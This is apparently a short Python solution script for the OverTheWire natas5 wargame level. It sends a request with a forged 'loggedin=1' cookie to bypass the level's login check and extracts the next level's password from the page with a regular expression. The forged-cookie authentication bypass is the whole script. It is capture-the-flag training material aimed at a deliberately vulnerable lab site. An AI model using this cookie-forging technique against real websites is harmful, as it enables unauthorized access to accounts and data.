#!/usr/bin/python3

import requests
import re
import os

username="natas5"
password=os.getenv("natas_pass")

url = "http://{0}.natas.labs.overthewire.org/".format(username)

cookies={'loggedin':'1'}

response = requests.get(url,auth=(username,password),cookies=cookies)

flag = re.findall("natas6 is (.*)</div>", response.text)[0]

print(flag)